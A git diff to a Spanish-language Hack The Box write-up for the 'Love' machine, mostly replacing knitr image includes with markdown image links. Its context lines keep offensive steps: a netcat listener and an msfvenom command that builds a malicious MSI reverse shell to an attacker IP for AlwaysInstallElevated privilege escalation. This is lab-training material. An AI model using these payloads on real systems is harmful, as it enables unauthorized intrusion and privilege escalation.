@@ -98,10 +98,8 @@ Tambien vemos un dominio `staging.love.htb`, quiere decir que es posible que se 
 Lo añadimos al `/etc/hosts` de la maquina de atacante.
 
 
-```{r, echo = FALSE, fig.cap="love virtual hosting", out.width="90%"}
-knitr::include_graphics("images/love-etc-hosts.png")
-```
 
+![love-etc-hosts](../assets/images/love-etc-hosts.png) 
 #### Chequear la web los puertos web {-}
 
 ```bash
@@ -230,10 +228,8 @@ Aqui vemos que el exploit nos da directamente une reverse shell.
 
     ```{r, echo = FALSE, fig.cap="voting system reverse shell", out.width="90%"}
     knitr::include_graphics("images/love-votingsystem-rshell.png")
-    ```
 
-1. Nos ponemos en escucha por el puerto 443
-
+![love-votisystem-rshell](../assets/images/love-votingsystem-rshell.png) 
     ```bash
     rlwrap nc -nlvp 443
     ```
@@ -296,10 +292,8 @@ Vemos algo interressante en Checking AlwaysInstallElevated
 knitr::include_graphics("images/love-hklm-hkcu.png")
 ```
 
-Podemos seguir los pasos descritos en el link [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)
 
-1. crear un msi malicioso con msfvenom
-
+![love-hklm-hkcu](../assets/images/love-hklm-hkcu.png) 
     ```bash
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f msi -o reverse.msi
     ```
